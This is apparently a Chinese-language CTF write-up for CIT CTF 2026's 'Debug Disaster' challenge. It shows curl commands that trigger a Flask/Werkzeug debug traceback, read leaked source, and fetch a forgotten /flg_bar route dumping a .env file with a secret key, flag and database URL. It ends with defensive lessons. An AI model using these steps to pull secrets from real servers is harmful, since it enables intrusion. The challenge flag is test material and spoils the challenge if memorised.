@@ -1,0 +1,61 @@
+---
+title: "CIT CTF 2026 · Debug Disaster：调试页带出的 .env 路由"
+description: Flask debug=True 暴露的不只是 traceback，把 .env 原文吐出来的路由也跟着一起进来了。
+pubDate: 2026-05-10
+tags: [CTF, cit-ctf-2026, web, flask]
+series: CIT CTF 2026
+---
+
+import Callout from '../../../components/Callout.astro';
+
+题目描述把所有提示都告诉你了：
+
+> Developing this application is tough, and I needed debug mode to be enabled... but I'm nervous I forgot to turn it off in production. I also think I may have forgot to remove something from the application structure.
+
+「忘了关 debug」「忘了删点东西」——这两句对应的就是这道题的两段利用。
+
+## 思路
+
+Flask 的 `debug=True` 一打开，未处理异常就会渲染 Werkzeug 的交互式 traceback 页面，里面带源码。先随便找个路由触发异常：
+
+```bash
+curl -sS http://23.179.17.92:5002/admin > /tmp/debug.html
+```
+
+`/admin` 的 handler 直接抛了一个异常，traceback 里能看到 `/app/app.py` 的源码片段：
+
+```python
+@app.route("/admin")
+def admin():
+    raise Exception("Debug leak triggered: Dirbuster maybe in your future!")
+
+@app.route("/flg_bar")
+def env():
+    return open(".env").read(), 200, {"Content-Type": "text/plain"}
+```
+
+第二段就是「忘记删掉的东西」——一个把 `.env` 原样吐出去的路由 `/flg_bar`。
+
+<Callout type="info">
+  这道题的两段提示其实是分开的。光看到 debug 页拿不到 flag，必须配合源码里漏出来的 `/flg_bar` 路由。Werkzeug debug 页的价值在于「让你读到原本不会公开的源码」。
+</Callout>
+
+## 利用
+
+```bash
+curl -sS http://23.179.17.92:5002/flg_bar
+```
+
+```
+SECRET_KEY=supersecret
+FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}
+DATABASE_URL=sqlite:///prod.db
+```
+
+`CIT{H1dd3n_D1r5_3v3rywh3r3}`
+
+## 复盘
+
+- Werkzeug debug 模式在生产环境长期是个反复出现的 OWASP top 10 入口，CVE 编号都懒得发新的了。
+- 「忘删的路由」是个挺有意思的设计模式：很多公司内部把 `/healthz`、`/debug/env`、`/admin/_internal` 这种东西塞进同一份代码，靠环境变量切开关。一旦在生产忘记关，开关本身就是攻击面。
+- 自己写 Flask 时，`.env` 那种东西别放 web root 同级，至少塞到 `/etc/` 或者父目录里，再用 `python-dotenv` 在启动时读一次。
